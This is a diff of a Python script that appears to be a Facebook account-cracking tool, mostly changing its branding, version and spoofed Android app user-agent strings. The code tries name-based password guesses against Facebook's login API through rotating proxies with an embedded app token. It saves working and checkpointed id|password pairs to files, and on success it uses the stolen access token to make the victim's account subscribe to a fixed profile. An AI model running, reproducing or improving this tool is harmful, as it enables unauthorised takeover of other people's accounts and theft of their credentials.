@@ -1,4 +1,4 @@
-import os,time,_md5,marshal,inspect,hashlib
+Enterimport os,time,_md5,marshal,inspect,hashlib
 import http.client
 import platform
 import base64
@@ -283,31 +283,21 @@ def Trial(PF):
 TrialExist=""
 logo=(f"""\033[1;37m
 
-{green}     
-{green}                                    _    
-
- .----------------.  .----------------.
-| .--------------. || .--------------. |
-| |   ________   | || |  ___  ____   | |
-| |  |  __   _|  | || | |_  ||_  _|  | |
-| |  |_/  / /    | || |   | |_/ /    | |
-| |     .'.' _   | || |   |  __'.    | |
-| |   _/ /__/ |  | || |  _| |  \ \_  | |
-| |  |________|  | || | |____||____| | |
-| |              | || |              | |
-| '--------------' || '--------------' |
- '----------------'  '----------------'
-             
-                                                                                                                                                                                           
-{green}   
+{green}    
+{green}       .----------------.  .----------------.                           | .--------------. || .--------------. |
+| |   ________   | || |  ___  ____   | |                          | |  |  __   _|  | || | |_  ||_  _|  | |
+| |  |_/  / /    | || |   | |_/ /    | |                          | |     .'.' _   | || |   |  __'.    | |                          | |   _/ /__/ |  | || |  _| |  \ \_  | |
+| |  |________|  | || | |____||____| | |                          | |              | || |              | |
+| '--------------' || '--------------' |                           '----------------'  '----------------'
+{green}    
   {green}     
-{green}  
-{green}     
+{green}
+{green}
    
 ─────────────────────────────────────────────
- {green}[{red}–{green}] FACEBOK : Achraf 
- {green}[{red}–{green}] GITHUB  : Z3im-38
- {green}[{red}–{green}] VERSION : 0.4
+ {green}[{red}–{green}] FACEBOK : achraf 
+ {green}[{red}–{green}] GITHUB  : achraf-38
+ {green}[{red}–{green}] VERSION : 0.6
  {green}[{red}–{green}] SERVICE : Free  
 ─────────────────────────────────────────────""")
 # I love you Mom 
@@ -496,7 +486,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a = "[Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/479.0.0.5.78;FBBV/49838828;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/13;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400}]"+"Dalvik/2.1.0 (Linux; U; Android 11; Pixel 6 Build/LOX1J8BY) [FBAN/FB4A;FBAV/422.0.0.7.80;FBBV/68174704;FBCR/O2;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 6;FBSV/11;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2340}]"
+                                u1a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 15.8.2; X657 Build/RD2A.181207.057) [FBAN/FB4A;FBAV/373.0.0.31.112;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/314614855;FBCR/Lycamobile Canada;FBMF/Infinix;FBBD/infinix;FBDV/X657;FBSV/15.8.2;FBCA/x86_64:x86:arm64-v8a:armeabi;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
@@ -531,7 +521,7 @@ def M_file_1(ids,names,passlist):
                                 
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
-                                        print('\r\x1b[1;92m<[achraf-OKO> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print('\r\x1b[1;92m<[𝐃𝒂𝒓𝒌-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                         #print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                                         token = q['access_token']
                                         requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
@@ -543,18 +533,18 @@ def M_file_1(ids,names,passlist):
                                 elif twf in str(po):
                                         if 'y' in pcp:
                                                 print('\r\r\033[1;34m<[𝐃𝒂𝒓𝒌-2F]> '+ids+' | '+pas)
-                                                open('/sdcard/zar-2F.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/𝐃𝒂𝒓𝒌-2F.txt','a').write(ids+'|'+pas+'\n')
                                                 twf.append(ids)
                                                 break
               
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\x1b[38;5;246m<[achraf[ach> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                                open('/sdcard/zar -CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\x1b[38;5;246m<[𝐃𝒂𝒓𝒌-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/𝐃𝒂𝒓𝒌-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/Zar-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/𝐃𝒂𝒓𝒌-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -584,7 +574,7 @@ def M_file_2(ids,names,passlist):
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                                 accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                                u2a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 11.6.5; RMX3586 Build/QQ3A.200508.039) [FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953126;FBDM/{density=3.8,width=973,height=1468};FBLC/en_AU;FBCR/Zybre Mobile;FBMF/Realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3586;FBSV/11.6.5;FBCA/arm64-v8a:armeabi;]"+"Dalvik/2.1.0 (Linux; U; Android 14.5.2; X748 Build/QP1A.160827.028) [FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/319214969;FBDM/{density=2.375,width=939,height=1254};FBLC/fr_CA;FBCR/Vidéotron;FBMF/Infinix;FBBD/infinix;FBPN/com.facebook.katana;FBDV/X748;FBSV/14.5.2;FBCA/x86_64:x86:arm64-v8a:armeabi;]"+"Dalvik/2.1.0 (Linux; U; Android 5.5.2; GT-I9200 Build/PD2A.110907.013) [FBAN/FB4A;FBAV/58.0.0.28.70;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/18971721;FBCR/Vodafone UK;FBMF/Samsung;FBBD/samsung;FBDV/GT-I9200;FBSV/5.5.2;FBCA/x86:arm64-v8a;]"
+                                u2a = "[Dalvik/2.1.0 (Linux; U; Android 13.5.4; K3 Note Build/TQ3A.220409.019) [FBAN/FB4A;FBAV/471.0.0.0.2;FBBV/453200356;FBDM/{density=3.8,width=1424,height=2534};FBLC/en_US;FBRV/453671450;FB_FW/2;FBCR/Verizon Wireless;FBMF/Lenovo;FBBD/lenovo;FBPN/com.facebook.katana;FBDV/K3 Note;FBSV/13.5.4;FBOP/20;FBCA/x86_64:x86:armeabi-v7a;]" +"[Dalvik/2.1.0 (Linux; U; Android 14.5.2; KSA-AL00 Build/QD4A.180105.035) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/273921938;FBCR/Zoomer Wireless;FBMF/Huawei;FBBD/huawei;FBDV/KSA-AL00;FBSV/14.5.2;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=1.278,width=893,height=1672};FB_FW/1;]"+"[Dalvik/2.1.0 (Linux; U; Android 14.5.2; KSA-AL00 Build/QD4A.180105.035) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/273921938;FBCR/Zoomer Wireless;FBMF/Huawei;FBBD/huawei;FBDV/KSA-AL00;FBSV/14.5.2;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=1.278,width=893,height=1672};FB_FW/1;]"
                                 head = {'User-Agent': u2a,'Accept-Encoding': 'gzip, deflate','Connection': 'Keep-Alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                                 data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'fr_DZ','client_country_code': 'DZ','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                                 data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
@@ -649,8 +639,7 @@ def M_file_3(ids,names,passlist):
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                 
-                                ua = "[Dalvik/2.1.0 (Linux; U; Android 12.7.1; G3216 Build/TP2A.160721.039) [FBAN/FB4A;FBAV/465.0.0.60.83;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/452016700;FBCR/Sky Mobile;FBMF/Sony;FBBD/sony;FBDV/G3216;FBSV/12.7.1;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=3.8,width=802,height=2547};]" +"[Dalvik/2.1.0 (Linux; U; Android 13.8.0; RMX3721 Build/TQ3A.110521.050) [FBAN/FB4A;FBAV/380.0.0.29.109;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/316015926;FBCR/Telus Mobility;FBMF/Realme;FBBD/realme;FBDV/RMX3721;FBSV/13.8.0;FBCA/arm64-v8a:;FBDM/{density=2.375,width=739,height=1225};FB_FW/1;]"+"[Dalvik/2.1.0 (Linux; U; Android 14.5.2; KSA-AL00 Build/QD4A.180105.035) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/273921938;FBCR/Zoomer Wireless;FBMF/Huawei;FBBD/huawei;FBDV/KSA-AL00;FBSV/14.5.2;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=1.278,width=893,height=1672};FB_FW/1;]"
-
+                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 14.5.1; B08FB1X4L6 Build/PD2A.240115.047) [FBAN/FB4A;FBAV/383.0.0.23.106;FBBV/316614371;FBDM/{density=1.0,width=954,height=1797};FBLC/de_DE;FBRV/316997418;FB_FW/2;FBCR/Vodafone CallYa Digital;FBMF/Amazon;FBBD/amazon;FBPN/com.facebook.katana;FBDV/B08FB1X4L6;FBSV/14.5.1;FBOP/1;FBCA/arm64-v8a:armeabi;]"  
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 li = ['28']
@@ -836,7 +825,7 @@ def M_file_4(ids, names, passlist):
 			fbsv = device['fbsv']
 			#fbca = device['fbca']
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-			ua = "[Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/438.0.0.39.81;FBBV/29751697;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/13;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400}]"+"[Dalvik/2.1.0 (Linux; U; Android 10; ASUS_Z010 Build/PLGSU5YD) [FBAN/FB4A;FBAV/422.0.0.29.113;FBBV/75186880;FBCR/Boost Mobile;FBMF/ASUS;FBBD/ASUS;FBPN/com.facebook.katana;FBDV/ASUS_Z010;FBSV/10;FBCA/arm64-v8a;FBDM/{density=3.0,width=720,height=1280}]"
+			ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsv+'.1.1; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.75,width=720,height=1529};FBLC/pt_BR;FBRV/'+fbrv+';FBCR/UNITEL;FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+fbsv+'.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
 			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(20000, 40000)),'X-FB-SIM-HNI':str(random.randint(20000, 40000)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'pt_BR','client_country_code':'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 			url = 'https://b-graph.facebook.com/auth/login'
